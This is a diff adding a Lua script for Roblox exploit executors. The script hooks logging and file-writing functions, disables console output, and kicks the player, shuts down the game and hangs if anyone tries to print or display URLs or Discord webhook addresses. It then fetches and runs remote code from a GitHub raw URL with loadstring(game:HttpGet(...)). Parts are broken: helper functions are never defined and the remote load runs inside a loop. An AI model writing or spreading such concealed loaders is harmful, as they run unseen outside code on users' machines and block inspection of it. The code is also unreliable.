@@ -1,0 +1,96 @@
+pcall(function()
+    local function kickAndShutdown()
+        game.Players.LocalPlayer:Kick("bro don't do that")
+        game:Shutdown()
+        while true do end
+    end
+
+    local hooks = {}
+
+    hooks[#hooks+1] = hookfunction(print, function(...)
+        kickAndShutdown()
+        return
+    end)
+
+    hooks[#hooks+1] = hookfunction(warn, function(...)
+        kickAndShutdown()
+        return
+    end)
+
+    hooks[#hooks+1] = hookfunction(error, function(...)
+        kickAndShutdown()
+        return
+    end)
+
+    hooks[#hooks+1] = hookfunction(print, function(a)
+        if string.find(a:lower(), "http") then
+            kickAndShutdown()
+        end
+    end)
+
+    hooks[#hooks+1] = hookfunction(warn, function(a)
+        if string.find(a:lower(), "http") then
+            kickAndShutdown()
+        end
+    end)
+
+    hooks[#hooks+1] = hookfunction(error, function(a)
+        if string.find(a:lower(), "http") then
+            kickAndShutdown()
+        end
+    end)
+
+    hooks[#hooks+1] = hookfunction(writefile, function(file, content)
+        if string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/') then
+            kickAndShutdown()
+        end
+        return oldwrite(file, content)
+    end)
+
+    hooks[#hooks+1] = hookfunction(appendfile, function(file, content)
+        if string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/') then
+            kickAndShutdown()
+        end
+        return oldappend(file, content)
+    end)
+
+    game.DescendantAdded:Connect(function(c)
+        if c and (c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message')) then
+            if string.find(string.lower(c.Text), 'http') then
+                kickAndShutdown()
+                c:Destroy()
+            end
+        end
+    end)
+
+    getgenv().rconsoletitle = nil
+    getgenv().rconsoleprint = nil
+    getgenv().rconsolewarn = nil
+    getgenv().rconsoleinfo = nil
+    getgenv().rconsolerr = nil
+    getgenv().clonefunction = function(...) while true do end return end
+
+    game.CoreGui.ChildAdded:Connect(function(c)
+        if string.lower(c.Name) == 'devconsolemaster' then
+            kickAndShutdown()
+            c:Destroy()
+        end
+    end)
+
+    local oldNamecall
+    oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if string.lower(method) == 'rconsoleprint' or string.lower(method) == 'rconsoleinfo' or string.lower(method) == 'rconsolewarn' or string.lower(method) == 'rconsoleerr' or string.lower(method) == 'warn' or string.lower(method) == 'error' or string.lower(method) == 'rendernametag' then
+            kickAndShutdown()
+        end
+        return oldNamecall(self, ...)
+    end))
+
+    -- Delay for 3 seconds before removing hooks to prevent lag
+    delay(3, function()
+        for _, unhook in pairs(hooks) do
+            unhook()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/synx/main/Mbm%20Hub/-_-.lua"))()
+        end
+    end)
+end)
